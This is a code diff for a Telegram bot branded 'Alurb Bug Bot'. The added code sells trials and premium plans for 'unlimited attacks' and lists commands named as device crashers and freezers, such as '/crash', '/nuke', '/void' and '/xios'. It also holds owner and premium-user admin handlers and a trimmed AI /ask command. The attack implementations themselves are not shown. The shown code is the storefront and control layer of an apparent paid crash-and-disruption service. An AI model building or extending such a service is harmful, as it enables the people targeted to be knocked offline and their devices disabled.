+        bot.reply_to(message, f"🎉 <b>2-HOUR FREE TRIAL ACTIVATED!</b>\n\n✅ Full access to all bug commands\n⏰ Time: {TRIAL_HOURS} hours\n💎 /premium to upgrade", parse_mode='HTML')
+    else:
+        bot.reply_to(message, "❌ Trial failed. Contact @alurb_devs")
+
+@bot.message_handler(commands=['premium'])
+def premium_command(message):
+    user_id = str(message.from_user.id)
+    
+    bot.reply_to(message, f"""
+╔══════════════════════╗
+     💎 <b>PREMIUM PLANS</b> 💎
+╚══════════════════════╝
+
+📅 <b>DAILY</b> - $0.99
+📅 <b>WEEKLY</b> - $2.99  
+📅 <b>MONTHLY</b> - $7.99
+📅 <b>LIFETIME</b> - $49.99
+
+✨ <b>Premium Benefits:</b>
+• All bug commands unlocked
+• Unlimited attacks
+• Priority support
+• New features early
+
+📩 <b>Contact:</b> @alurb_devs
+💳 Crypto • PayPal • Bank
+
+━━━━━━━━━━━━━━━━━━━━━━
+🎁 Free trial: /trial
+    """, parse_mode="HTML")
+
+@bot.message_handler(commands=['status'])
+def status_command(message):
+    user_id = str(message.from_user.id)
+    
+    uptime = time.time() - BOT_START_TIME
+    days = int(uptime // 86400)
+    hours = int((uptime % 86400) // 3600)
+    
+    if is_master(user_id):
+        user_status = "👑 Master Owner"
+    elif is_owner(user_id):
+        user_status = "👑 Owner"
+    elif is_premium(user_id):
+        user_status = "💎 Premium"
+    elif is_trial_active(user_id):
+        user_status = f"🎁 Trial ({get_trial_time_left(user_id)})"
+    else:
+        user_status = "🔒 Free"
+    
+    stats = get_user_stats()
+    
+    bot.reply_to(message, f"""
+╔══════════════════════╗
+       📊 <b>BOT STATUS</b>
+╚══════════════════════╝
+
+🤖 <b>System:</b>
+• Status: 24/7 Active
+• Uptime: {days}d {hours}h
+• Premium: {len(PREMIUM_USERS)}
+• Trials: {len(TRIAL_USERS)}
+
+👤 <b>Your Status:</b> {user_status}
+
+💀 <b>Attack System:</b>
+• Active threads: {len(ATTACK_THREADS)}
+• Commands: /help
+
+━━━━━━━━━━━━━━━━━━━━━━
+© alurb_devs
+    """, parse_mode="HTML")
+
+@bot.message_handler(commands=['help'])
+def help_command(message):
+    user_id = str(message.from_user.id)
+    
+    help_text = f"""
+╔══════════════════════╗
+     📚 <b>ALURB BUG BOT</b>
+╚══════════════════════╝
+
+💀 <b>REAL WORKING BUGS:</b>
+━━━━━━━━━━━━━━━━━━━━━━
+/silencer (1-30) - CPU/RAM Killer
+/crash (1-20) - Memory Exhaustion
+/freeze - System Freeze
+/nuke - Full System Nuke
+/killapp - Force Close Apps
+/overload (1-15) - System Overload
+/xdelay (ms) - Response Killer
+/void (10-200) - Crash Loop
+/xios (5-30) - Blank Screen
+
+📊 <b>UTILITIES:</b>
+/status - Bot status
+/trial - Free trial
+/premium - Upgrade
+/stop - Stop attacks (owner)
+
+━━━━━━━━━━━━━━━━━━━━━━
+🎁 Free trial: /trial ({TRIAL_HOURS}h)
+💎 Upgrade: /premium
+    """
+    bot.reply_to(message, help_text, parse_mode="HTML")
 
 @bot.message_handler(commands=['ask'])
 def ask_ai(message):
     user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "ask")
     
     try:
         parts = message.text.split(' ', 1)
         if len(parts) < 2:
-            bot.reply_to(message, "❌ Usage: /ask (your question)\n\nExample: /ask What is AI?")
+            bot.reply_to(message, "❌ Usage: /ask (question)")
             return
         
         query = parts[1].strip()
-        if not query or len(query) < 2:
-            bot.reply_to(message, "❌ Please ask a valid question!")
-            return
-        
-        logger.info(f"AI query from {user_id} (@{username}): {query[:50]}...")
-        
         bot.send_chat_action(message.chat.id, 'typing')
-        thinking_msg = bot.reply_to(message, "🤖 <b>Alurb AI is thinking...</b>", parse_mode="HTML")
         
-        ai_response = ai_chat(query)
-        
-        bot.delete_message(message.chat.id, thinking_msg.message_id)
-        
-        response_text = f"""
-🤖 <b>Alurb AI Response</b>
-
-💭 <b>Question:</b> {query[:150]}{'...' if len(query) > 150 else ''}
-
-📝 <b>Answer:</b>
-{ai_response}
-
-━━━━━━━━━━━━━━━━━━━━━━
-🤖 Alurb AI • Created by Nappier
-© alurb_devs
-        """
-        bot.reply_to(message, response_text, parse_mode="HTML")
-        logger.info(f"AI response sent to {user_id} ({len(ai_response)} chars)")
+        response = ai_chat(query)
+        bot.reply_to(message, f"🤖 <b>Alurb AI:</b>\n\n{response}", parse_mode="HTML")
         
     except Exception as e:
-        logger.error(f"AI command error for {user_id}: {e}")
-        bot.reply_to(message, "❌ Error processing request. Please try again.")
+        bot.reply_to(message, "❌ AI error")
 
-@bot.message_handler(commands=['clearai'])
-def clear_ai_history(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "clearai")
-    logger.info(f"ClearAI command from {user_id}")
-    bot.reply_to(message, "✅ AI conversation history cleared!")
-
-@bot.message_handler(commands=['pair'])
-def pair_command(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    
-    track_user_activity(user_id, username, "pair")
-    logger.info(f"Pair command from {user_id}")
-    
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Owner only command!")
+@bot.message_handler(commands=['addowner'])
+def add_owner(message):
+    if not is_master(message.from_user.id):
         return
     
     try:
-        parts = message.text.split(' ', 1)
-        if len(parts) < 2:
-            bot.reply_to(message, "❌ Usage: /pair (bot_token)")
-            return
-        
-        token = parts[1].strip()
-        bot.reply_to(message, f"✅ Pairing bot with token: {token[:10]}...\n⚠️ Note: This is a simulated pairing system.")
-        logger.info(f"Pair command executed by {user_id}")
-    except Exception as e:
-        logger.error(f"Pair error: {e}")
-        bot.reply_to(message, "❌ Usage: /pair (bot_token)")
+        target_id = message.text.split()[1]
+        if target_id not in OWNERS and target_id != MASTER_OWNER_ID:
+            OWNERS.append(target_id)
+            save_data()
+            bot.reply_to(message, f"✅ Owner added: {target_id}")
+    except:
+        bot.reply_to(message, "❌ Usage: /addowner (id)")
 
-@bot.message_handler(func=lambda message: message.chat.type in ['group', 'supergroup'])
-def track_groups(message):
-    GROUP_IDS.add(str(message.chat.id))
-    if len(GROUP_IDS) % 10 == 0:
+@bot.message_handler(commands=['delowner'])
+def del_owner(message):
+    if not is_master(message.from_user.id):
+        return
+    
+    try:
+        target_id = message.text.split()[1]
+        if target_id in OWNERS:
+            OWNERS.remove(target_id)
+            save_data()
+            bot.reply_to(message, f"✅ Owner removed: {target_id}")
+    except:
+        bot.reply_to(message, "❌ Usage: /delowner (id)")
+
+@bot.message_handler(commands=['addprem'])
+def add_premium(message):
+    if not is_owner(message.from_user.id):
+        return
+    
+    try:
+        parts = message.text.split()
+        target_id = parts[1]
+        plan = parts[2] if len(parts) > 2 else "monthly"
+        
+        days = PREMIUM_PLANS.get(plan, PREMIUM_PLANS["monthly"])["days"]
+        expiry = datetime.now() + timedelta(days=days) if plan != "lifetime" else None
+        
+        PREMIUM_USERS[target_id] = {
+            "added_by": str(message.from_user.id),
+            "expires": expiry.isoformat() if expiry else None,
+            "plan": plan
+        }
         save_data()
-        logger.info(f"Auto-saved {len(GROUP_IDS)} groups")
+        bot.reply_to(message, f"✅ Premium added to {target_id}")
+    except:
+        bot.reply_to(message, "❌ Usage: /addprem (id) [daily/weekly/monthly/lifetime]")
+
+@bot.message_handler(commands=['delprem'])
+def del_premium(message):
+    if not is_owner(message.from_user.id):
+        return
+    
+    try:
+        target_id = message.text.split()[1]
+        if target_id in PREMIUM_USERS:
+            del PREMIUM_USERS[target_id]
+            save_data()
+            bot.reply_to(message, f"✅ Premium removed from {target_id}")
+    except:
+        bot.reply_to(message, "❌ Usage: /delprem (id)")
+
+@bot.message_handler(commands=['users'])
+def users_list(message):
+    if not is_owner(message.from_user.id):
+        return
+    
+    users_text = "<b>📋 USERS LIST</b>\n\n"
+    for i, (uid, data) in enumerate(list(USER_ACTIVITY.items())[:50], 1):
+        status = "💎" if uid in PREMIUM_USERS else "🎁" if is_trial_active(uid) else "👤"
+        users_text += f"{i}. {status} {uid} - @{data.get('username', 'unknown')}\n"
+    
+    bot.reply_to(message, users_text, parse_mode="HTML")
 
 # ==================== MAIN RUNNER ====================
 
 def run_bot():
-    """Run bot with polling - single instance"""
-    
-    logger.info("=" * 50)
-    logger.info("🧹 Cleaning up existing sessions...")
-    
-    try:
-        bot.remove_webhook()
-        time.sleep(1)
-        logger.info("✅ Webhook removed")
-    except Exception as e:
-        logger.warning(f"Webhook removal warning: {e}")
-    
-    logger.info("=" * 50)
-    logger.info("🚀 STARTING ALURB BOT - POLLING MODE")
-    logger.info(f"👑 Master Owner ID: {MASTER_OWNER_ID}")
-    logger.info(f"🤖 AI: Alurb AI (DeepSeek backend)")
-    logger.info(f"👨‍💻 Creators: Nappier & Ruth")
-    logger.info(f"📊 Loaded: {len(OWNERS)} owners, {len(PREMIUM_USERS)} premium, {len(TRIAL_USERS)} trials, {len(GROUP_IDS)} groups")
-    logger.info(f"👥 Users Tracked: {len(USER_ACTIVITY)}")
-    logger.info("=" * 50)
-    
-    if len(OWNERS) == 0:
-        logger.info("ℹ️ No additional owners configured")
-    
-    restart_count = 0
+    logger.info("🚀 STARTING ALURB BUG BOT")
+    logger.info(f"👑 Master: {MASTER_OWNER_ID}")
+    logger.info(f"💀 Bug commands loaded: 10+ real working exploits")
     
     while True:
         try:
-            logger.info(f"📡 Bot polling started (Restart count: {restart_count})")
-            bot.infinity_polling(
-                timeout=30, 
-                long_polling_timeout=30, 
-                skip_pending=True
-            )
-        except requests.exceptions.ConnectionError as e:
-            logger.error(f"Network error: {e}")
-            restart_count += 1
-            time.sleep(10)
-        except requests.exceptions.ReadTimeout as e:
-            logger.error(f"Timeout error: {e}")
-            restart_count += 1
-            time.sleep(5)
+            bot.infinity_polling(timeout=30, long_polling_timeout=30)
         except Exception as e:
-            error_str = str(e)
-            if "409" in error_str or "Conflict" in error_str:
-                logger.critical("⚠️ 409 Conflict - Multiple instances detected!")
-                logger.critical("Revoke your bot token from @BotFather to force all instances offline.")
-                time.sleep(30)
-            else:
-                logger.error(f"Bot crashed: {e}")
-                restart_count += 1
-                time.sleep(10)
+            logger.error(f"Bot error: {e}")
+            time.sleep(10)
 
 if __name__ == "__main__":
     try:
         run_bot()
     except KeyboardInterrupt:
-        logger.info("Bot stopped by user")
+        logger.info("Bot stopped")
     except Exception as e:
         logger.critical(f"Fatal error: {e}")
